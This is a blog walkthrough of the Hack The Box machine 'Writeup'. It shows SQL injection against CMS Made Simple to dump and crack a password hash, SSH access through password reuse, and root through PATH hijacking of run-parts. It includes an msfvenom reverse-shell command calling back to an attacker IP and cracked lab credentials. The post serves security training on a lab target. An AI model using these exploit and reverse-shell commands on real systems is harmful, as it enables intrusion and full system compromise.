---
layout: single
title: Writeup - Hack The Box
excerpt: "Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to `/usr/local` and I can write a binary payload in there that gets executed by run-parts when I SSH in because it's called without the full path. Another nice box by jkr."
date: 2019-10-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-writeup/writeup_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
  - sqli
  - cms
---

![](/assets/images/htb-writeup-writeup/writeup_logo.png)

Writeup starts off easy with an unauthenticated vulnerability in CMS Made Simple that I exploit to dump the database credentials. After cracking the user hash, I can log in to the machine because the user re-used the same password for SSH. The priv esc is pretty nice: I have write access to `/usr/local` and I can write a binary payload in there that gets executed by run-parts when I SSH in because it's called without the full path. Another nice box by jkr.

## Summary

- Unauthenticated SQL injection in CMS Made Simple gives us the password hash which we can crack
- The CMS user / password can be used to SSH in to the server (password re-use)
- The `/usr/local/bin` directory is writable by low-priv user and we can hijack `run-parts` which is run by root when SSHing in (path abuse)

## Tools/Blogs used

- CMS Made Simple < 2.2.10 - SQL Injection (exploits/php/webapps/46635.py)

### Portscan

```
# nmap -p- 10.10.10.138
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-08 22:30 EDT
Nmap scan report for writeup.htb (10.10.10.138)
Host is up (0.018s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 105.16 seconds
```

### Website enumeration

The website contains information about fail2ban or a similar kind of script running to prevent 40x errors. This means that if we try to dirbust the site we'll probably get banned.

![](/assets/images/htb-writeup-writeup/1.png)

So I checked `robots.txt` and found the following:

```
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: *
Disallow: /writeup/
```

Checking out `http://10.10.10.138/writeup/` I see it's some kind of barebone webpage.

![](/assets/images/htb-writeup-writeup/2.png)

The links just display different writeups for previous HTB boxes. I couldn't trigger any LFI, RFI or SQL injection from `/writeup/index.php?page=`

There's a hint at the bottom of the page that it's *NOT* made with vim.

![](/assets/images/htb-writeup-writeup/3.png)

Checking out the source code, I can see it's made with CMS Made Simple.

![](/assets/images/htb-writeup-writeup/4.png)

### SQL injection in CMS

Checking out searchsploit, I see a whole bunch of exploits for that CMS.

![](/assets/images/htb-writeup-writeup/5.png)

The one I highlighted above is an Unauthenticated SQL Injection that allows an attacker to dump the username and password hash from the database. To exploit it, we just need to pass the URI of the CMS and the wordlist we'll use to crack the password hash:

`python exploit.py -u http://10.10.10.138/writeup/ --crack -w /usr/share/wordlists/rockyou.txt`

![](/assets/images/htb-writeup-writeup/6.png)

We just found the password for user `jkr`: `raykayjay9`

The CMS administration webpage at `http://10.10.10.138/writeup/admin` is protected by an additional HTTP basic web authentication. This is not part of the standard CMS deployment so it was probably added by the box creator. I'm not able to authenticate using the credentials I found in the database and if I try to bruteforce it I get locked out by fail2ban.

However the credentials do work with SSH and I'm able to get a shell and the first flag:

```
# ssh jkr@10.10.10.138
jkr@10.10.10.138's password:
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jkr@writeup:~$ cat user.txt
d4e493...
```

### Privesc

My user is part of the following groups: `uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)`

I ran through the standard Linux enumeration, checking permissions on files and directories, and noticed that I have write access to folders inside `/usr/local`:

```
jkr@writeup:~$ ls -l /usr/local
total 56
drwx-wsr-x 2 root staff 20480 Apr 19 04:11 bin
drwxrwsr-x 2 root staff  4096 Apr 19 04:11 etc
drwxrwsr-x 2 root staff  4096 Apr 19 04:11 games
drwxrwsr-x 2 root staff  4096 Apr 19 04:11 include
drwxrwsr-x 4 root staff  4096 Apr 24 13:13 lib
lrwxrwxrwx 1 root staff     9 Apr 19 04:11 man -> share/man
drwx-wsr-x 2 root staff 12288 Apr 19 04:11 sbin
drwxrwsr-x 7 root staff  4096 Apr 19 04:30 share
drwxrwsr-x 2 root staff  4096 Apr 19 04:11 src
```

However, I can't see the contents of `/usr/local/bin` and `/usr/local/sbin`. This is not a standard Linux distro configuration so the box creator probably changed the permissions on purpose so HTB players can't piggy-back on other players binaries.

I copied `pspy` to the box and found a cronjob running every minute:

![](/assets/images/htb-writeup-writeup/7.png)

I don't have access to the content of the script but it's safe to assume that it deletes files or folders somewhere on the system. I created a test file inside `/usr/local/bin` to see if the script would delete it. After a minute, I saw that the file was removed:

```
jkr@writeup:/usr/local/bin$ echo test > test
jkr@writeup:/usr/local/bin$ cat test
test
jkr@writeup:/usr/local/bin$ cat test
test
jkr@writeup:/usr/local/bin$ cat test
cat: test: No such file or directory
```

Because we can write files into `/usr/local/bin` and `/usr/local/sbin`, we can potentially get RCE since the default path for users is the following:

```
jkr@writeup:/usr/local/bin$ cat /etc/profile
# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).

if [ "`id -u`" -eq 0 ]; then
  PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
else
  PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
```

`/usr/local/bin` and `/usr/local/sbin` are preferred over the other paths so it's clear what we need to do here:

 - Find the filename of something that is executed by root (that filename must be executed without the full path)
 - Find the trigger for executing that command as root

I thought I could use `grep` or `iptables` but that didn't work. I think it's because the programs are executed by fail2ban which is started with a modified path as per `/etc/init.d/fail2ban`:

```
PATH=/usr/sbin:/usr/bin:/sbin:/bin
```

I also noticed that the `run-parts` program is executed whenever I SSH in:

![](/assets/images/htb-writeup-writeup/8.png)

> run-parts runs all the executable files named within constraints described below, found in directory  directory. Other files and directories are silently ignored.

I can't make run-parts run arbitrary binaries since I can't write `/etc/update-motd.d/` but because the program is run without the full path I can write my own `run-parts` binary to `/usr/local/bin` or `/usr/local/sbin` and it will be executed instead of the real one because the directory is located in front in the PATH variable definition.

For the malicious binary, I use a standard linux reverse shell payload generated with Metasploit:
```
# msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10.10.14.7 LPORT=4444
chmod +x ./shell
```

I just need to upload the file to `/usr/local/bin/run-parts` and SSH in to trigger a callback and get root privileges.

![](/assets/images/htb-writeup-writeup/9.png)

